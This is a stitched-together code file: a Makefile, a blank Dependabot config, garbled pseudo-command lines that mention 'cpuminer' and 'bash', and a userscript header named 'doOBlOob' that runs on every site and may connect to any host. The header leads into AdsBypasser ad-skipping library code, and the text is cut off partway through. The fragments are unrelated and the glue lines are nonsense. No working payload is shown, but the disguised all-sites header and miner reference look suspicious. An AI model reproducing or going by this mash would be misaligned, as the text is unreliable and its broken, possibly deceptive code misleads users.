CFLAGS += -fPIC -std=c11 -Wall -Wextra

all: libandroid-utimes.a libandroid-utimes.so
libandroid-utimes.a: sys_time.o
	$(AR) rcu $@ sys_time.o

libandroid-utimes.so:
	$(CC) $(LDFLAGS) -fPIC -shared sys_time.c -o $@

sys_time.o: sys_time.c
	$(CC) $(CFLAGS) -c sys_time.c -o $@

install: libandroid-utimes.a libandroid-utimes.so
	install -D libandroid-utimes.a $(DESTDIR)$(PREFIX)/lib/libandroid-utimes.a
	install -D libandroid-utimes.so $(DESTDIR)$(PREFIX)/lib/libandroid-utimes.so

clean:
	rm -f libandroid-utimes.a libandroid-utimes.so

.PHONY: install

# To get started with Dependabot version updates, you'll need to specify which
# package ecosystems to update and where the package manifests are located.
# Please see the documentation for all configuration options:
# https://docs.github.com/code-security/dependabot/dependabot-version-updates/configuration-options-for-the-dependabot.yml-file

version: 2
updates:
  - package-ecosystem: "" # See documentation for possible values
    directory: "/" # Location of package manifests
    schedule:
      interval: "weekly"


(system): trace,'run.js'
bash ./locate-php//#/*
ip==system,'dOolBlOob',balanced:dashboard[domain%redirect#//#/*]'"*"'

document-cpuminer(run-try)`~`bash has notice upgrade:!(!(!(!(!(!++))))):// ==UserScript==
// @name        doOBlOob
// @version     dob5
// @author      dob5
// @license     dob5
// @copyright   dob5
// @match       *://*/*
// @match       *.*,//#/
// @include     *://*/*
// @include     *.*,//#/
// @require     *
// @grant       js.i--TODO==usr":('IN-mailbox.'//'/io-get.g-i/*''//#'/''):"*,*"
// @connect     *
// @connect     https://cdnjs.cloudflare.com
// @connect     https://cdn.jsdelivr.net
// @grant          unsafeWindow
// @grant          GM_xmlhttpRequest
// @grant          GM_addStyle
// @grant          GM_getResourceText
// @grant          GM_getResourceURL
// @grant          GM_getValue
// @grant          GM_openInTab
// @grant          GM_registerMenuCommand
// @grant          GM_setValue
// @run-at         document-start
// @include        http://*
// @include        https://*
// @connect      engageub.pythonanywhere.com
// @require      http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js
// ==/UserScript==
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = factory(context, Promise);
  } else {
    var P = null;
    if (context.unsafeWindow.Future) {
      P = function (fn) {
        return context.unsafeWindow.Future.call(this, function (fr) {
          fn(fr.resolve.bind(fr), fr.reject.bind(fr));
        });
      };
    } else if (context.PromiseResolver) {
      P = function (fn) {
        return new context.Promise(function (pr) {
          fn(pr.resolve.bind(pr), pr.reject.bind(pr));
        });
      };
    } else if (typeof context.Promise === 'function') {
      P = context.Promise;
    } else {
      P = this.Promise;
    }
    factory(context, P);
  }
}(this, function (context, Promise) {
  'use strict';
  var _ = context._ = {};
  function setupStack () {
    if (Error.captureStackTrace) {
      Error.captureStackTrace(this, this.constructor);
    } else if (!this.hasOwnProperty('stack')) {
      var stack = (new Error()).stack.split('\n').slice(2);
      var e = stack[0].match(/^.*@(.*):(\d*)$/);
      this.fileName = e[1];
      this.lineNumber = parseInt(e[2], 10);
      this.stack = stack.join('\n');
    }
  }
  function AdsBypasserError (message) {
    setupStack.call(this);
    this.message = message;
  }
  AdsBypasserError.prototype = Object.create(Error.prototype);
  AdsBypasserError.prototype.constructor = AdsBypasserError;
  AdsBypasserError.prototype.name = 'AdsBypasserError';
  AdsBypasserError.extend = function (protoProps, staticProps) {
    var parent = this, child = function () {
      setupStack.call(this);
      protoProps.constructor.apply(this, arguments);
    };
    extend(child, parent, staticProps);
    child.prototype = Object.create(parent.prototype);
    extend(child.prototype, protoProps);
    child.prototype.constructor = child;
    child.super = parent.prototype;
    return child;
  };
  AdsBypasserError.super = null;
  _.AdsBypasserError = AdsBypasserError;
  function any (c, fn) {
    if (c.some) {
      return c.some(fn);
    }
    if (typeof c.length === 'number') {
      return Array.prototype.some.call(c, fn);
    }
    return Object.keys(c).some(function (k) {
      return fn(c[k], k, c);
    });
  }
  function all (c, fn) {
    if (c.every) {
      return c.every(fn);
    }
    if (typeof c.length === 'number') {
      return Array.prototype.every.call(c, fn);
    }
    return Object.keys(c).every(function (k) {
      return fn(c[k], k, c);
    });
  }
  function each (c, fn) {
    if (c.forEach) {
      c.forEach(fn);
    } else if (typeof c.length === 'number') {
      Array.prototype.forEach.call(c, fn);
    } else {
      Object.keys(c).forEach(function (k) {
        fn(c[k], k, c);
      });
    }
  }
  function map (c, fn) {
    if (c.map) {
      return c.map(fn);
    }
    if (typeof c.length === 'number') {
      return Array.prototype.map.call(c, fn);
    }
    return Object.keys(c).map(function (k) {
      return fn(c[k], k, c);
    });
  }
  function extend(c) {
    Array.prototype.slice.call(arguments, 1).forEach(function (source) {
      if (!source) {
        return;
      }
      _.C(source).each(function (v, k) {
        c[k] = v;
      });
    });
    return c;
  }
  function CollectionProxy (collection) {
    this._c = collection;
  }
  CollectionProxy.prototype.size = function () {
    if (typeof this._c.length === 'number') {
      return this._c.length;
    }
    return Object.keys(c).length;
  };
  CollectionProxy.prototype.at = function (k) {
    return this._c[k];
  };
  CollectionProxy.prototype.each = function (fn) {
    each(this._c, fn);
    return this;
  };
  CollectionProxy.prototype.find = function (fn) {
    var result;
    any(this._c, function (value, index, self) {
      var tmp = fn(value, index, self);
      if (tmp !== _.none) {
        result = {
          key: index,
          value: value,
          payload: tmp,
        };
        return true;
      }
      return false;
    });
    return result;
  };
  CollectionProxy.prototype.all = function (fn) {
    return all(this._c, fn);
  };
  CollectionProxy.prototype.map = function (fn) {
    return map(this._c, fn);
  };
  _.C = function (collection) {
    return new CollectionProxy(collection);
  };
  _.T = function (s) {
    if (typeof s === 'string') {
    } else if (s instanceof String) {
      s = s.toString();
    } else {
      throw new AdsBypasserError('template must be a string');
    }
    var T = {
      '{{': '{',
      '}}': '}',
    };
    return function () {
      var args = Array.prototype.slice.call(arguments);
      var kwargs = args[args.length-1];
      return s.replace(/\{\{|\}\}|\{([^\}]+)\}/g, function (m, key) {
        if (T.hasOwnProperty(m)) {
          return T[m];
        }
        if (args.hasOwnProperty(key)) {
          return args[key];
        }
        if (kwargs.hasOwnProperty(key)) {
          return kwargs[key];
        }
        return m;
      });
    };
  };
  _.P = function (fn) {
    if (typeof fn !== 'function') {
      throw new _.AdsBypasserError('must give a function');
    }
    var slice = Array.prototype.slice;
    var args = slice.call(arguments, 1);
    return function () {
      return fn.apply(this, args.concat(slice.call(arguments)));
    };
  };
  _.D = function (fn) {
    return new Promise(fn);
  };
  _.parseJSON = function (json) {
    try {
      return JSON.parse(json);
    } catch (e) {
      _.warn(e, json);
    }
    return _.none;
  };
  _.isString = function (value) {
    return (typeof value === 'string') || (value instanceof String);
  };
  _.nop = function () {
  };
  _.none = _.nop;
  _.wait = function (msDelay) {
    return _.D(function (resolve, reject) {
      setTimeout(resolve, msDelay);
    });
  };
  _.try = function (msInterval, fn) {
    return _.D(function (resolve, reject) {
      var handle = setInterval(function () {
        var result = fn();
        if (result !== _.none) {
          clearInterval(handle);
          resolve(result);
        }
      }, msInterval);
    });
  };
  function log (method, args) {
    if (_._quiet) {
      return;
    }
    args = Array.prototype.slice.call(args);
    if (_.isString(args[0])) {
      args[0] = 'AdsBypasser: ' + args[0];
    } else {
      args.unshift('AdsBypasser:');
    }
    var f = console[method];
    if (typeof f === 'function') {
      f.apply(console, args);
    }
  }
  _._quiet = false;
  _.info = function () {
    log('info', arguments);
  };
  _.warn = function () {
    log('warn', arguments);
  };
  return _;
}));
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context) {
      var core = require('./core.js');
      return factory(context, core);
    };
  } else {
    context.$ = factory(context, context._);
  }
}(this, function (context, _) {
  'use strict';
  var window = context.window;
  var document = window.document;
  var DomNotFoundError = _.AdsBypasserError.extend({
    name: 'DomNotFoundError',
    constructor: function (selector) {
      DomNotFoundError.super.constructor.call(this, _.T('`{0}` not found')(selector));
    },
  });
  var $ = function (selector, context) {
    if (!context || !context.querySelector) {
      context = document;
    }
    var n = context.querySelector(selector);
    if (!n) {
      throw new DomNotFoundError(selector);
    }
    return n;
  };
  $.$ = function (selector, context) {
    try {
      return $(selector, context);
    } catch (e) {
      return null;
    }
  };
  $.$$ = function (selector, context) {
    if (!context || !context.querySelectorAll) {
      context = document;
    }
    var ns = context.querySelectorAll(selector);
    return _.C(ns);
  };
  $.toDOM = function(rawHTML) {
    try {
      var parser = new DOMParser();
      var DOMHTML = parser.parseFromString(rawHTML, "text/html");
      return DOMHTML;
    } catch (e) {
      throw new _.AdsBypasserError('could not parse HTML to DOM');
    }
  };
  $.removeNodes = function (selector, context) {
    $.$$(selector, context).each(function (e) {
      e.parentNode.removeChild(e);
    });
  };
  function searchScriptsByRegExp (pattern, context) {
    var m = $.$$('script', context).find(function (s) {
      var m = s.innerHTML.match(pattern);
      if (!m) {
        return _.none;
      }
      return m;
    });
    if (!m) {
      return null;
    }
    return m.payload;
  }
  function searchScriptsByString (pattern, context) {
    var m = $.$$('script', context).find(function (s) {
      var m = s.innerHTML.indexOf(pattern);
      if (m < 0) {
        return _.none;
      }
      return m;
    });
    if (!m) {
      return null;
    }
    return m.value.innerHTML;
  }
  $.searchScripts = function (pattern, context) {
    if (pattern instanceof RegExp) {
      return searchScriptsByRegExp(pattern, context);
    } else if (_.isString(pattern)) {
      return searchScriptsByString(pattern, context);
    } else {
      return null;
    }
  };
  return $;
}));
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context, GM) {
      var core = require('./core.js');
      return factory(context, GM, core);
    };
  } else {
    factory(context, {
      xmlhttpRequest: GM_xmlhttpRequest,
    }, context._);
  }
}(this, function (context, GM, _) {
  'use strict';
  var window = context.window;
  var document = window.document;
  var $ = context.$ || {};
  function deepJoin (prefix, object) {
    return _.C(object).map(function (v, k) {
      var key = _.T('{0}[{1}]')(prefix, k);
      if (typeof v === 'object') {
        return deepJoin(key, v);
      }
      return _.T('{0}={1}').apply(this, [key, v].map(encodeURIComponent));
    }).join('&');
  }
  function toQuery (data) {
    var type = typeof data;
    if (data === null || (type !== 'string' && type !== 'object')) {
      return '';
    }
    if (type === 'string') {
      return data;
    }
    if (data instanceof String) {
      return data.toString();
    }
    return _.C(data).map(function (v, k) {
      if (typeof v === 'object') {
        return deepJoin(k, v);
      }
      return _.T('{0}={1}').apply(this, [k, v].map(encodeURIComponent));
    }).join('&');
  }
  function ajax (method, url, data, headers) {
    var l = document.createElement('a');
    l.href = url;
    var reqHost = l.hostname;
    var overrideHeaders = {
      Host: reqHost || window.location.host,
      Origin: window.location.origin,
      Referer: window.location.href,
      'X-Requested-With': 'XMLHttpRequest',
    };
    _.C(overrideHeaders).each(function (v, k, c) {
      if (headers[k] === _.none) {
        delete headers[k];
      } else {
        headers[k] = v;
      }
    });
    if (data) {
      if (headers['Content-Type'].indexOf('json') >= 0) {
        data = JSON.stringify(data);
      } else {
        data = toQuery(data);
      }
      headers['Content-Length'] = data.length;
    }
    var xhr = null;
    var promise = _.D(function (resolve, reject) {
      xhr = GM.xmlhttpRequest({
        method: method,
        url: url,
        data: data,
        headers: headers,
        onload: function (response) {
          response = (typeof response.responseText !== 'undefined') ? response : this;
          if (response.status !== 200) {
            reject(response.responseText);
          } else {
            resolve(response.responseText);
          }
        },
        onerror: function (response) {
          response = (typeof response.responseText !== 'undefined') ? response : this;
          reject(response.responseText);
        },
      });
    });
    promise.abort = function () {
      xhr.abort();
    };
    return promise;
  }
  $.get = function (url, data, headers) {
    data = toQuery(data);
    data = data ? '?' + data : '';
    headers = headers || {};
    return ajax('GET', url + data, '', headers);
  };
  $.post = function (url, data, headers) {
    var h = {
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    };
    if (headers) {
      _.C(headers).each(function (v, k) {
        h[k] = v;
      });
    }
    return ajax('POST', url, data, h);
  };
  return $;
}));
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context) {
      var core = require('./core.js');
      return factory(context, core);
    };
  } else {
    factory(context, context._);
  }
}(this, function (context, _) {
  'use strict';
  var window = context.window;
  var document = window.document;
  var $ = context.$ || {};
  $.setCookie = function (key, value) {
    var now = new Date();
    now.setTime(now.getTime() + 3600 * 1000);
    var tpl = _.T('{0}={1};path={2};');
    document.cookie = tpl(key, value, window.location.pathname, now.toUTCString());
  };
  $.getCookie = function (key) {
    var c = _.C(document.cookie.split(';')).find(function (v) {
      var k = v.replace(/^\s*([a-zA-Z0-9-_]+)=.+$/, '$1');
      if (k !== key) {
        return _.none;
      }
    });
    if (!c) {
      return null;
    }
    c = c.value.replace(/^\s*[a-zA-Z0-9-_]+=([^;]+).?$/, '$1');
    if (!c) {
      return null;
    }
    return c;
  };
  $.resetCookies = function () {
    var a = document.domain;
    var b = document.domain.replace(/^www\./, '');
    var c = document.domain.replace(/^(\w+\.)+?(\w+\.\w+)$/, '$2');
    var d = (new Date(1e3)).toUTCString();
    _.C(document.cookie.split(';')).each(function (v) {
      var k = v.replace(/^\s*(\w+)=.+$/, '$1');
      document.cookie = _.T('{0}=;expires={1};')(k, d);
      document.cookie = _.T('{0}=;path=/;expires={1};')(k, d);
      var e = _.T('{0}=;path=/;domain={1};expires={2};');
      document.cookie = e(k, a, d);
      document.cookie = e(k, b, d);
      document.cookie = e(k, c, d);
    });
  };
  return $;
}));
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context) {
      var core = require('./core.js');
      return factory(context, core);
    };
  } else {
    factory(context, context._);
  }
}(this, function (context, _) {
  'use strict';
  var window = context.window;
  var document = window.document;
  var $ = context.$ || {};
  var patterns = [];
  $.register = function (pattern) {
    patterns.push(pattern);
  };
  function dispatchByObject (rule, url_6) {
    var matched = {};
    var passed = _.C(rule).all(function (pattern, part) {
      if (pattern instanceof RegExp) {
        matched[part] = url_6[part].match(pattern);
      } else if (pattern instanceof Array) {
        var r = _.C(pattern).find(function (p) {
          var m = url_6[part].match(p);
          return m || _.none;
        });
        matched[part] = r ? r.payload : null;
      }
      return !!matched[part];
    });
    return passed ? matched : null;
  }
  function dispatchByRegExp (rule, url_1) {
    return url_1.match(rule);
  }
  function dispatchByArray (rules, url_1, url_3, url_6) {
    var tmp = _.C(rules).find(function (rule) {
      var m = dispatch(rule, url_1, url_3, url_6);
      if (!m) {
        return _.none;
      }
      return m;
    });
    return tmp ? tmp.payload : null;
  }
  function dispatchByString (rule, url_3) {
    var scheme = /\*|https?|file|ftp|chrome-extension/;
    var host = /\*|(\*\.)?([^\/*]+)/;
    var path = /\/.*/;
    var up = new RegExp(_.T('^({scheme})://({host})?({path})$')({
      scheme: scheme.source,
      host: host.source,
      path: path.source,
    }));
    var matched = rule.match(up);
    if (!matched) {
      return null;
    }
    scheme = matched[1];
    host = matched[2];
    var wc = matched[3];
    var sd = matched[4];
    path = matched[5];
    if (scheme === '*' && !/https?/.test(url_3.scheme)) {
      return null;
    } else if (scheme !== url_3.scheme) {
      return null;
    }
    if (scheme !== 'file' && host !== '*') {
      if (wc) {
        up = url_3.host.indexOf(sd);
        if (up < 0 || up + sd.length !== url_3.host.length) {
          return null;
        }
      } else if (host !== url_3.host) {
        return null;
      }
    }
    path = new RegExp(_.T('^{0}$')(path.replace(/[*.\[\]?+#]/g, function (c) {
      if (c === '*') {
        return '.*';
      }
      return '\\' + c;
    })));
    if (!path.test(url_3.path)) {
      return null;
    }
    return url_3;
  }
  function dispatchByFunction (rule, url_1, url_3, url_6) {
    return rule(url_1, url_3, url_6);
  }
  function dispatch (rule, url_1, url_3, url_6) {
    if (rule instanceof Array) {
      return dispatchByArray(rule, url_1, url_3, url_6);
    }
    if (typeof rule === 'function') {
      return dispatchByFunction(rule, url_1, url_3, url_6);
    }
    if (rule instanceof RegExp) {
      return dispatchByRegExp(rule, url_1);
    }
    if (_.isString(rule)) {
      return dispatchByString(rule, url_3);
    }
    return dispatchByObject(rule, url_6);
  }
  $._findHandler = function () {
    var url_1 = window.location.toString();
    var url_3 = {
      scheme: window.location.protocol.slice(0, -1),
      host: window.location.host,
      path: window.location.pathname + window.location.search + window.location.hash,
    };
    var url_6 = {
      scheme: window.location.protocol,
      host: window.location.hostname,
      port: window.location.port,
      path: window.location.pathname,
      query: window.location.search,
      hash: window.location.hash,
    };
    var pattern = _.C(patterns).find(function (pattern) {
      var m = dispatch(pattern.rule, url_1, url_3, url_6);
      if (!m) {
        return _.none;
      }
      return m;
    });
    if (!pattern) {
      return null;
    }
    var matched = pattern.payload;
    pattern = pattern.value;
    if (!pattern.start && !pattern.ready) {
      return null;
    }
    return {
      start: pattern.start ? _.P(pattern.start, matched) : _.nop,
      ready: pattern.ready ? _.P(pattern.ready, matched) : _.nop,
    };
  };
  return $;
}));
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context) {
      var core = require('./core.js');
      return factory(context, core);
    };
  } else {
    factory(context, context._);
  }
}(this, function (context, _) {
  'use strict';
  var window = context.window;
  var document = window.document;
  var $ = context.$ || {};
  function prepare (e) {
    if (!document.body) {
      document.body = document.createElement('body');
    }
    document.body.appendChild(e);
    return _.wait(0);
  }
  function get (url) {
    var a = document.createElement('a');
    a.href = url;
    var clicked = false;
    a.addEventListener('click', function (event) {
      event.stopPropagation();
      clicked = true;
    });
    prepare(a).then(() => {
      a.click();
      var tick = setInterval(function () {
        if (clicked) {
          _.info('already clicked');
          clearInterval(tick);
          return;
        }
        _.info('try again');
        a.click();
      }, 50);
    });
  }
  function post (path, params) {
    params = params || {};
    var form = document.createElement('form');
    form.method = 'post';
    form.action = path;
    _.C(params).each(function (value, key) {
        var input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = value;
        form.appendChild(input);
    });
    prepare(form);
    form.submit();
  }
  $.openLink = function (to, options) {
    if (!_.isString(to) && !to) {
      _.warn('false URL');
      return;
    }
    options = options || {};
    var withReferer = typeof options.referer === 'undefined' ? true : options.referer;
    var postData = options.post;
    var from = window.location.toString();
    _.info(_.T('{0} -> {1}')(from, to));
    if (postData) {
      post(to, postData);
      return;
    }
    if (withReferer) {
      get(to);
      return;
    }
    window.top.location.replace(to);
  };
  return $;
}));
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context) {
      var core = require('./core.js');
      var ajax = require('./ajax.js');
      var $ = ajax(context);
      return factory(context, core, $);
    };
  } else {
    factory(context, context._, context.$);
  }
}(this, function (context, _, $) {
  'use strict';
  var window = context.window;
  var unsafeWindow = context.unsafeWindow || (0, eval)('this').window;
  var document = window.document;
  $.removeAllTimer = function () {
    var handle = window.setInterval(_.nop, 10);
    while (handle > 0) {
      window.clearInterval(handle--);
    }
    handle = window.setTimeout(_.nop, 10);
    while (handle > 0) {
      window.clearTimeout(handle--);
    }
  };
  $.nuke = function (url) {
    try {
      $.window.document.write('nuked by AdsBypasser, leading to ...<br/>');
    } catch (e) {
      _.warn('nuke failed', e);
    }
    var a = document.createElement('a');
    a.href = url;
    a.textContent = url;
    document.body.appendChild(a);
  };
  $.generateRandomIP = function () {
    return [0,0,0,0].map(function () {
      return Math.floor(Math.random() * 256);
    }).join('.');
  };
  $.captcha = function (imgSrc, cb) {
    if (!$.config.externalServerSupport) {
      return;
    }
    var a = document.createElement('canvas');
    var b = a.getContext('2d');
    var c = new Image();
    c.src = imgSrc;
    c.onload = function () {
      a.width = c.width;
      a.height = c.height;
      b.drawImage(c, 0, 0);
      var d = a.toDataURL();
      var e = d.substr(d.indexOf(',') + 1);
      $.post('http://www.wcpan.info/cgi-bin/captcha.cgi', {
        i: e,
      }, cb);
    };
  };
  function clone (safe) {
    if (safe === null || !(safe instanceof Object)) {
      return safe;
    }
    if (safe === unsafeWindow) {
      return safe;
    }
    if (safe instanceof String) {
      return safe.toString();
    }
    if (safe instanceof Function) {
      return exportFunction(safe, unsafeWindow, {
        allowCrossOriginArguments: true,
      });
    }
    if (safe instanceof Array) {
      var unsafe = new unsafeWindow.Array();
      for (var i = 0; i < safe.length; ++i) {
        unsafe.push(clone(safe[i]));
      }
      return unsafe;
    }
    var unsafe = new unsafeWindow.Object();
    _.C(safe).each(function (v, k) {
      unsafe[k] = clone(v);
    });
    return unsafe;
  }
  var MAGIC_KEY = '__adsbypasser_reverse_proxy__';
  $.window = (function () {
    var isFirefox = typeof InstallTrigger !== 'undefined';
    if (!isFirefox) {
      return unsafeWindow;
    }
    var decorator = {
      set: function (target, key, value) {
        if (key === MAGIC_KEY) {
          return false;
        }
        if (target === unsafeWindow && key === 'open') {
          var d = Object.getOwnPropertyDescriptor(target, key);
          d.value = clone(function () {
            var rv = value();
            return cloneInto(rv, unsafeWindow);
          });
          Object.defineProperty(target, key, d);
        } else {
          target[key] = clone(value);
        }
        return true;
      },
      get: function (target, key) {
        if (key === MAGIC_KEY) {
          return target;
        }
        var value = target[key];
        var type = typeof value;
        if (value === null || (type !== 'function' && type !== 'object')) {
          return value;
        }
        return new Proxy(value, decorator);
      },
      apply: function (target, self, args) {
        args = Array.prototype.slice.call(args);
        if (target === unsafeWindow.Object.defineProperty) {
          args[0] = args[0][MAGIC_KEY];
        }
        if (target === unsafeWindow.Function.apply) {
          self = self[MAGIC_KEY];
          args[1] = Array.prototype.slice.call(args[1]);
        }
        if (target === unsafeWindow.document.querySelector) {
          self = self[MAGIC_KEY];
        }
        if (target === unsafeWindow.document.write) {
          self = self[MAGIC_KEY];
        }
        var usargs = clone(args);
        return target.apply(self, usargs);
      },
      construct: function (target, args) {
        args = Array.prototype.slice.call(args);
        args.unshift(undefined);
        var usargs = clone(args);
        var bind = unsafeWindow.Function.prototype.bind;
        return new (bind.apply(target, usargs));
      },
    };
    return new Proxy(unsafeWindow, decorator);
  })();
  return $;
}));
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context, GM) {
      var _ = require('lodash');
      var core = require('./core.js');
      var misc = require('./misc.js');
      var dispatcher = require('./dispatcher.js');
      var modules = [misc, dispatcher].map(function (v) {
        return v.call(null, context, GM);
      });
      var $ = _.assign.apply(null, modules);
      return factory(context, GM, core, $);
    };
  } else {
    factory(context, {
      getValue: GM_getValue,
      setValue: GM_setValue,
    }, context._, context.$);
  }
}(this, function (context, GM, _, $) {
  'use strict';
  var MANIFEST = [
    {
      name: 'version',
      key: 'version',
      default_: 0,
      verify: function (v) {
        return typeof v === 'number' && v >= 0;
      },
      normalize: toNumber,
    },
    {
      name: 'alignCenter',
      key: 'align_center',
      default_: true,
      verify: isBoolean,
      normalize: toBoolean,
    },
    {
      name: 'changeBackground',
      key: 'change_background',
      default_: true,
      verify: isBoolean,
      normalize: toBoolean,
    },
    {
      name: 'externalServerSupport',
      key: 'external_server_support',
      default_: false,
      verify: isBoolean,
      normalize: toBoolean,
    },
    {
      name: 'redirectImage',
      key: 'redirect_image',
      default_: true,
      verify: isBoolean,
      normalize: toBoolean,
    },
    {
      name: 'scaleImage',
      key: 'scale_image',
      default_: true,
      verify: isBoolean,
      normalize: toBoolean,
    },
    {
      name: 'logLevel',
      key: 'log_level',
      default_: 1,
      verify: function (v) {
        return typeof v === 'number' && v >= 0 && v <= 2;
      },
      normalize: toNumber,
    },
  ];
  var PATCHES = [
    function (c) {
      var ac = typeof c.alignCenter === 'boolean';
      if (typeof c.changeBackground !== 'boolean') {
        c.changeBackground = ac ? c.alignCenter : true;
      }
      if (typeof c.scaleImage !== 'boolean') {
        c.scaleImage = ac ? c.alignCenter : true;
      }
      if (!ac) {
        c.alignCenter = true;
      }
      if (typeof c.redirectImage !== 'boolean') {
        c.redirectImage = true;
      }
    },
    function (c) {
      if (typeof c.externalServerSupport !== 'boolean') {
        c.externalServerSupport = false;
      }
    },
    function (c) {
      if (typeof c.logLevel !== 'number') {
        c.logLevel = 1;
      }
    },
  ];
  var window = context.window;
  function isBoolean (v) {
    return typeof v === 'boolean';
  }
  function toBoolean (v) {
    return !!v;
  }
  function toNumber (v) {
    return parseInt(v, 10);
  }
  function createConfig () {
    var c = {};
    _.C(MANIFEST).each(function (m) {
      Object.defineProperty(c, m.name, {
        configurable: true,
        enumerable: true,
        get: function () {
          return GM.getValue(m.key, m.default_);
        },
        set: function (v) {
          GM.setValue(m.key, v);
          var nv = GM.getValue(m.key, m.default_);
          if (nv !== v) {
            var s = _.T('failed to write config, key: {0}, value: {1}, new: {2}');
            throw new _.AdsBypasserError(s(s.key, nv, v));
          }
        },
      });
    });
    return c;
  }
  function senityCheck (c) {
    var ok = _.C(MANIFEST).all(function (m) {
      return m.verify(c[m.name]);
    });
    if (!ok) {
      c.version = 0;
    }
    return c;
  }
  function migrate (c) {
    if (typeof c.version !== 'number' || c.version < 0) {
      throw new _.AdsBypasserError('wrong config version: ' + c.version);
    }
    while (c.version < PATCHES.length) {
      PATCHES[c.version](c);
      ++c.version;
    }
    return c;
  }
  $.config = migrate(senityCheck(createConfig()));
  $.register({
    rule: {
      host: /^adsbypasser\.github\.io$/,
      path: /^\/configure\.html$/,
    },
    ready: function () {
      $.window.commit = function (data) {
        data.version = $.config.version;
        _.C(data).each(function (v, k) {
          $.config[k] = v;
        });
      };
      $.window.render({
        version: $.config.version,
        options: {
          alignCenter: {
            type: 'checkbox',
            value: $.config.alignCenter,
            label: 'Align Center',
            help: 'Align image to the center if possible. (default: enabled)',
          },
          changeBackground: {
            type: 'checkbox',
            value: $.config.changeBackground,
            label: 'Change Background',
            help: 'Use Firefox-like image background if possible. (default: enabled)',
          },
          redirectImage: {
            type: 'checkbox',
            value: $.config.redirectImage,
            label: 'Redirect Image',
            help: [
              'Directly open image link if possible. (default: enabled)',
              'If disabled, redirection will only works on link shortener sites.',
            ].join('<br/>\n'),
          },
          scaleImage: {
            type: 'checkbox',
            value: $.config.scaleImage,
            label: 'Scale Image',
            help: 'When image loaded, scale it to fit window if possible. (default: enabled)',
          },
          externalServerSupport: {
            type: 'checkbox',
            value: $.config.externalServerSupport,
            label: 'External Server Support',
            help: [
              'Send URL information to external server to enhance features (e.g.: captcha resolving). (default: disabled)',
              'Affected sites:',
              'setlinks.us (captcha)',
            ].join('<br/>\n'),
          },
          logLevel: {
            type: 'select',
            value: $.config.logLevel,
            menu: [
              [0, '0 (quiet)'],
              [1, '1 (default)'],
              [2, '2 (verbose)'],
            ],
            label: 'Log Level',
            help: [
              'Log level in developer console. (default: 1)',
              '0 will not print anything in console.',
              '1 will only print logs on affected sites.',
              '2 will print on any sites.',
            ].join('<br/>\n'),
          },
        },
      });
    },
  });
  return $;
}));
$.register({
  rule: {
    host: /^01\.nl$/,
  },
  ready: function () {
    'use strict';
    var f = $('iframe#redirectframe');
    $.openLink(f.src);
  },
});
$.register({
  rule: {
    host: /^10co\.(biz|xyz|co|me)$/,
  },
  ready: function () {
    'use strict';
    var d = $('.go');
    $.openLink(d.dataset.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?1be\.biz$/,
    path: /^\/s\.php$/,
    query: /^\?(.+)/,
  },
  start: function (m) {
    'use strict';
    $.openLink(m.query[1]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?1tiny\.net$/,
    path: /\/\w+/
  },
  ready: function () {
    'use strict';
    var directUrl = $.searchScripts(/window\.location='([^']+)';/);
    if (!directUrl) {
      throw new _.AdsBypasserError('script content changed');
    }
    $.openLink(directUrl[1]);
  },
});
$.register({
  rule: {
    host: /^2ty\.cc$/,
    path: /^\/.+/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var a = $('#close');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?3ra\.be$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var f = $.window.fc;
    if (!f) {
      throw new _.AdsBypasserError('window.fc is undefined');
    }
    f = f.toString();
    f = f.match(/href="([^"]*)/);
    if (!f) {
      throw new _.AdsBypasserError('url pattern outdated');
    }
    $.openLink(f[1]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?4fun\.tw$/,
  },
  ready: function () {
    'use strict';
    var i = $('#original_url');
    $.openLink(i.value);
  },
});
$.register({
  rule: {
    host: /^ad2links\.com$/,
    path: /^\/\w-.+$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    $.openLinkByPost(window.location.toString(), {
      post: {
        image: 'Skip Ad.',
      },
    });
  },
});
$.register({
  rule: {
    host: /^ad4\.fr$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var s = $.searchScripts(/"src", "([^"]+)"/);
    if (!s) {
      _.warn('changed');
      return;
    }
    $.openLink(s[1]);
  },
});
(function () {
  'use strict';
  $.register({
    rule: {
      host: /^ad7\.biz$/,
      path: /^\/\d+\/(.*)$/,
    },
    start: function (m) {
      $.removeNodes('iframe');
      var redirectLink = m.path[1];
      if (!redirectLink.match(/^https?:\/\//)) {
        redirectLink = "http://" + redirectLink;
      }
      $.openLink(redirectLink);
    },
  });
  $.register({
    rule: {
      host: /^ad7\.biz$/,
      path: /^\/\w+$/,
    },
    ready: function () {
      $.removeNodes('iframe');
      var script = $.searchScripts('var r_url');
      var url = script.match(/&url=([^&]+)/);
      url = url[1];
      $.openLink(url);
    },
  });
})();
(function () {
  'use strict';
  $.register({
    rule: {
      host: [
        /^(www\.)?adb\.ug$/,
        /^(www\.)?lynk\.my$/,
        /^adyou\.me$/,
      ],
      path: /^(?!\/(?:privacy|terms|contact(\/.*)?|#.*)?$).*$/
    },
    ready: function () {
      'use strict';
      $.removeNodes('iframe');
      var m = $.searchScripts(/top\.location\.href="([^"]+)"/);
      if (m) {
        $.openLink(m[1]);
        return;
      }
      getArguments().then(function (args) {
        tryLink(args);
      });
    },
  });
  function getArguments () {
    var PATTERN = /\{\s*_args[^}]+\}[^}]+\}/;
    return _.D(function (resolve, reject) {
